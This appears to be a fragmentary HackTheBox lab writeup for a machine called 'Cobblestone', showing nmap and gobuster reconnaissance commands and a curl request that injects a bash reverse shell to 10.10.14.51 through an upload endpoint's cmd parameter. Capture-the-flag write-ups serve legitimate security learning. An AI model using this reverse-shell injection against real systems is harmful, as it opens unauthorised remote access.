---
layout: page
title: "Cobblestone - HackTheBox Writeup"
...
```bash
nmap -sC -sV -oN nmap.txt 10.10.11.x
```
...
```bash
gobuster dir -u http://10.10.11.x/ -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
```
...
```bash
curl -X POST -d "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'" http://10.10.11.x/api/upload
```
